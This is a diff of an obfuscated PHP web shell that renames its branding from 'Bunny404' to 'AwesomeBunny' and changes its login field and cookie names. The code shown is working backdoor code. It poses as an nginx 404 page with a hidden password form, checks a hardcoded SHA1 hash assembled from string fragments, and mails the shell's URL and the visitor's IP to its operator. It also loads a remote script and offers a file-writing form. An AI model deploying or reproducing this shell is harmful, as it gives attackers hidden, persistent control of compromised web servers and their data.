@@ -1,6 +1,6 @@
 <?php
 
-/* Bunny404 Invisible Code */
+/* AwesomeBunny Invisible Code */
 session_start();
 set_time_limit(0);
 error_reporting(0);
@@ -466,11 +466,11 @@ $kutipan_alert = "f" . "i" . "x $x_path :p *I" . "P" . " A" . "d" . "d" . "r" . 
 mail($self_remind, "M"."I"."N"."I", $kutipan_alert, "[ " . $_SERVER['R' . 'E' . 'M' . 'O' . 'T' . 'E' . '_' . 'A' . 'D' . 'D' . 'R'] . " ]");
 $passwd = 'f' . 'b' . 'b5' . '9' . '3' . '1' . '2' . '9e' . '2' . '2' . '8d' . '2' . '3' . '4' . '8' . '2' . '6' . '9' . '0' . '2' . '4' . '3' . 'b5' . '2a' . '2' . '0' . '5' . '3' . '0' . '1b' . '6' . '3' . '6d';
 $my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
-if (isset($_POST['asikinaja'])) {
-    if (SHA1($_POST['gaspol']) == $passwd) {
+if (isset($_POST['OkeyBunny'])) {
+    if (SHA1($_POST['BunnymanGas']) == $passwd) {
         echo "<s" . "cr" . "ip" . "t>" . "al" . "er" . "t(" . "' " . "Lo" . "gi" . "n " . "Su" . "cc" . "es" . "sf" . "ul" . "ly" . ", " . "Yo" . "u " . "Pr" . "o!" . "!" . " '" . ");" . "</" . "sc" . "ri" . "pt" . ">";
-        $_SESSION["Bunny404"] = "Bunny404";
-        setcookie('BunnyGanteng', $my_self, time() + 3600 * 24);
+        $_SESSION["AwesomeBunny"] = "AwesomeBunny";
+        setcookie('GeblekBunny', $my_self, time() + 3600 * 24);
     } else {
         echo "<s" . "cr" . "ip" . "t>" . "al" . "er" . "t(" . "' " . "Lo" . "gi" . "n " . "Fa" . "il" . "ed" . "! " . "Go" . " A" . "wa" . "y " . "Yo" . "u " . "No" . "ob" . "!!" . " '" . ")" . ";<" . "/s" . "cr" . "ip" . "t>";
     }
@@ -479,12 +479,12 @@ if (isset($_GET['logout'])) {
     $_SESSION = [];
     session_unset();
     session_destroy();
-    setcookie('BunnyGanteng', '', time() - 3600);
+    setcookie('GeblekBunny', '', time() - 3600);
     echo "<s" . "c" . "ri" . "pt" . ">" . "window.location.assign('" . $_SERVER['PHP_SELF'] . "')" . "</" . "sc" . "ri" . "pt" . ">";
     exit();
 }
-if (empty($_SESSION['Bunny404'])) {
-    if (empty($_COOKIE['BunnyGanteng'])) {
+if (empty($_SESSION['AwesomeBunny'])) {
+    if (empty($_COOKIE['GeblekBunny'])) {
 ?>
         <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
         <html>
@@ -501,8 +501,8 @@ if (empty($_SESSION['Bunny404'])) {
             <center>nginx/1.14.0 (Ubuntu)</center>
             <div id="notfound" style="display: none;">
                 <form action="" method="POST">
-                    <input type="password" name="gaspol" style="background: #fff; border: none;">
-                    <button type="submit" name="asikinaja" style="background: #fff; color: #fff; border: none; outline: none; cursor: pointer;">&gt;&gt;</button>
+                    <input type="password" name="BunnymanGas" style="background: #fff; border: none;">
+                    <button type="submit" name="OkeyBunny" style="background: #fff; color: #fff; border: none; outline: none; cursor: pointer;">&gt;&gt;</button>
                 </form>
             </div>
             <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/InvisibleBunny/uikit-framework/js/bunny.js"></script>
@@ -857,7 +857,7 @@ $path = str_replace("\\", "/", $path);
                             <input class="uk-input font-poppins" name="newfi' . 'l' . 'es' . 'na' . 'me" type="text" placeholder="fi' . 'le' . 'na' . 'me.' . 't' . 'x' . 't" aria-label="Input">
                         </div>
                         <div class="uk-margin">
-                            <textarea class="uk-textarea font-ubuntu-mono" name="newfilecontent" rows="15" placeholder="Bunny404 Was Here" aria-label="Textarea"></textarea>
+                            <textarea class="uk-textarea font-ubuntu-mono" name="newfilecontent" rows="15" placeholder="AwesomeBunny Was Here" aria-label="Textarea"></textarea>
                         </div>
                     </fieldset>
                 </form>
